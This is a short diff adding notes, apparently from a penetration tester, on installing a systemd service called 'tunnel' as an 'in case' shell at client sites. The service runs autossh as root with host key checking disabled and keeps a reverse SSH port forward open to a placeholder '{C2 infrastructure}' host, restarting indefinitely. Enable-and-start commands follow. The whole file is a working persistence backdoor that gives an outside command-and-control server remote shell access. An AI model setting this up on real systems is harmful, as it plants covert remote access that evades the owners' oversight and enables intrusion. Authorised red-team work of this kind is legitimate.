@@ -1,0 +1,25 @@
+#This adds a new service called "tunnel" service. This is how I like to make sure I have an "in case" shell.
+#Configuring OpenVPN is still the "best" option, but sometimes I have to drop to the rev SSH to configure it because something on the client site blocks the VPN tunnel
+
+vi /etc/systemd/system/tunnel.service
+
+[Unit]
+Description=Maintain Persistent Tunnel
+After=network-online.target
+
+[Service]
+User=root
+ExecStart=/usr/bin/autossh -o StrictHostKeyChecking=no -i /root/.ssh/{key} -o ServerAliveInterval=60 -o ExitOnForwardFailure=yes -gnNT -R 2222:localhost:22 root@{C2 infrastructure}
+RestartSec=15
+Restart=always
+KillMode=mixed
+
+[Install]
+WantedBy=multi-user.target
+
+
+
+# follow this with the following:
+#sudo systemctl daemon-reload
+#sudo systemctl enable tunnel
+#sudo systemctl start tunnel
